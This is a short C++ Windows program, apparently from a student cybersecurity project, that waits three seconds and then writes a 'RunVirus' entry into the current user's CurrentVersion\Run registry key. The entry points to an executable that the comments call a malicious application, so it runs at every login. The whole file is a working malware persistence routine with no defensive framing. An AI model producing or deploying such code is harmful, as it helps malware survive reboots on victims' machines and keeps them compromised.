// Importing the required modules
#include <windows.h>
#include <string.h>
#include <iostream>

int main(int argc, char* argv[]) {
    /**
     * The main function of the program.
     *
     * This function is the entry point of the program. It performs the following tasks:
     * 1. Waits for 3 seconds.
     * 2. Opens a registry key for writing.
     * 3. Creates a new registry entry to execute a malicious application on startup.
     *
     * @param argc The number of command-line arguments passed to the program.
     * @param argv An array of strings containing the command-line arguments.
     * @return An integer representing the exit status of the program.
     */
       
    // Wait for 3 seconds before proceeding
    Sleep(3000);
    HKEY hkey = NULL;

    // Path to the malicious application
    const char* exe = "D:\\Cyber\\YB_CYBER\\project\\FinalProject\\De_Bug\\De_Bug\\mewo.exe";

    // Open the registry key for startup programs under HKEY_CURRENT_USER
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, (LPCSTR)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);

    // Set the value of the registry key to the path of the malicious application
    RegSetValueExA(hkey, (LPCSTR)"RunVirus", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);

    return 0;
}
